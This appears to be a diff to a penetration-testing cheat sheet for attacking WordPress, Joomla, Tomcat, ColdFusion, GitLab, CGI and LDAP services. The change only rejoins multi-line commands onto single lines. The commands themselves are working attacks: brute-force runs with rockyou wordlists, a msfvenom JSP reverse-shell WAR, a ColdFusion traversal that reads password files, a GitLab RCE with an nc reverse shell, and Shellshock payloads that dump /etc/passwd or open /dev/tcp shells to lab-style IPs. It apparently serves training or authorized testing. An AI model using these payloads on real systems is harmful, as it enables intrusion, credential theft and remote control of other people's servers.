@@ -68,12 +68,10 @@ curl -s http://target.com/?p=1 | grep plugins
 
 ```bash
 # Enumerate plugins
-ffuf -w /usr/share/nmap/nselib/data/wp-plugins.lst:FUZZ \
-  -u http://target.com/wp-content/plugins/FUZZ/readme.txt
+ffuf -w /usr/share/nmap/nselib/data/wp-plugins.lst:FUZZ -u http://target.com/wp-content/plugins/FUZZ/readme.txt
 
 # Enumerate themes
-ffuf -w /usr/share/nmap/nselib/data/wp-themes.lst:FUZZ \
-  -u http://target.com/wp-content/themes/FUZZ/readme.txt
+ffuf -w /usr/share/nmap/nselib/data/wp-themes.lst:FUZZ -u http://target.com/wp-content/themes/FUZZ/readme.txt
 ```
 
 ### WPScan
@@ -86,14 +84,10 @@ sudo gem install wpscan
 sudo wpscan --url http://target.com --enumerate --api-token <TOKEN>
 
 # Brute-force via xmlrpc (faster)
-sudo wpscan --password-attack xmlrpc -t 20 \
-  -U admin,john -P /usr/share/wordlists/rockyou.txt \
-  --url http://target.com
+sudo wpscan --password-attack xmlrpc -t 20 -U admin,john -P /usr/share/wordlists/rockyou.txt --url http://target.com
 
 # Brute-force via wp-login
-sudo wpscan --password-attack wp-login -t 20 \
-  -U admin -P /usr/share/wordlists/rockyou.txt \
-  --url http://target.com
+sudo wpscan --password-attack wp-login -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://target.com
 ```
 
 **WPScan Enumerate Flags:**
@@ -214,10 +208,7 @@ python2.7 joomlascan.py -u http://target.com
 ```bash
 # Default admin account is: admin
 # Script-based brute force
-sudo python3 joomla-brute.py \
-  -u http://target.com \
-  -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt \
-  -usr admin
+sudo python3 joomla-brute.py -u http://target.com -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```
 
 ### Exploitation — RCE via Template Editor
@@ -241,9 +232,7 @@ curl -s "http://target.com/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef
 **CVE-2019-10945 — Directory Traversal + File Deletion (Joomla 1.5–3.9.4)**
 
 ```bash
-python2.7 joomla_dir_trav.py \
-  --url "http://target.com/administrator/" \
-  --username admin --password admin --dir /
+python2.7 joomla_dir_trav.py --url "http://target.com/administrator/" --username admin --password admin --dir /
 ```
 
 ---
@@ -367,8 +356,7 @@ run
 curl -s http://target.com:8080/docs/ | grep Tomcat
 
 # Directory enumeration
-gobuster dir -u http://target.com:8080/ \
-  -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+gobuster dir -u http://target.com:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 ```
 
 ### Key Paths & Files
@@ -406,11 +394,7 @@ run
 ### Brute Force — Python Script
 
 ```bash
-python3 mgr_brute.py \
-  -U http://target.com:8180/ \
-  -P /manager \
-  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
-  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+python3 mgr_brute.py -U http://target.com:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
 ### Exploitation — WAR File Upload (RCE)
@@ -430,8 +414,7 @@ curl "http://target.com:8080/backup/cmd.jsp?cmd=id"
 **WAR file via msfvenom:**
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp \
-  LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
 
 nc -lnvp 4443
 # Upload WAR → click /backup in Manager GUI
@@ -681,8 +664,7 @@ searchsploit -p 14641
 cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
 
 # Retrieve password.properties
-python2 14641.py 10.x.x.x 8500 \
-  "../../../../../../../../ColdFusion8/lib/password.properties"
+python2 14641.py 10.x.x.x 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
 ```
 
 **Vulnerable endpoints:**
@@ -729,10 +711,7 @@ python3 50057.py
 Affects GitLab CE ≤ 13.10.2 — ExifTool metadata handling in uploaded images
 
 ```bash
-python3 gitlab_13_10_2_rce.py \
-  -t http://gitlab.target.com:8081 \
-  -u mrb3n -p password1 \
-  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
+python3 gitlab_13_10_2_rce.py -t http://gitlab.target.com:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
 
 nc -lnvp 8443
 ```
@@ -777,22 +756,19 @@ nc -lnvp 8443
 ### Fingerprinting — Find CGI Scripts
 
 ```bash
-gobuster dir -u http://target.com/cgi-bin/ \
-  -w /usr/share/wordlists/dirb/small.txt -x cgi,pl,sh,py
+gobuster dir -u http://target.com/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,pl,sh,py
 ```
 
 ### Confirm Shellshock (CVE-2014-6271)
 
 ```bash
-curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
-  bash -s :'' http://target.com/cgi-bin/access.cgi
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://target.com/cgi-bin/access.cgi
 ```
 
 ### Exploitation — Reverse Shell
 
 ```bash
-curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' \
-  http://target.com/cgi-bin/access.cgi
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://target.com/cgi-bin/access.cgi
 
 nc -lvnp 7777
 ```
@@ -807,11 +783,9 @@ Windows only, `enableCmdLineArguments=true`. Affects Tomcat 7.0.0–7.0.93, 8.5.
 
 ```bash
 # Look for .bat and .cmd files
-ffuf -w /usr/share/dirb/wordlists/common.txt \
-  -u http://target.com:8080/cgi/FUZZ.bat
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target.com:8080/cgi/FUZZ.bat
 
-ffuf -w /usr/share/dirb/wordlists/common.txt \
-  -u http://target.com:8080/cgi/FUZZ.cmd
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target.com:8080/cgi/FUZZ.cmd
 ```
 
 ### Exploitation
@@ -867,11 +841,7 @@ gobuster dir -u http://target.com/ -w /tmp/list.txt -x .aspx,.asp
 ### ldapsearch
 
 ```bash
-ldapsearch -H ldap://ldap.target.com:389 \
-  -D "cn=admin,dc=target,dc=com" \
-  -w secret123 \
-  -b "ou=people,dc=target,dc=com" \
-  "(mail=john.doe@target.com)"
+ldapsearch -H ldap://ldap.target.com:389 -D "cn=admin,dc=target,dc=com" -w secret123 -b "ou=people,dc=target,dc=com" "(mail=john.doe@target.com)"
 ```
 
 ### Authentication Bypass — Wildcard Injection
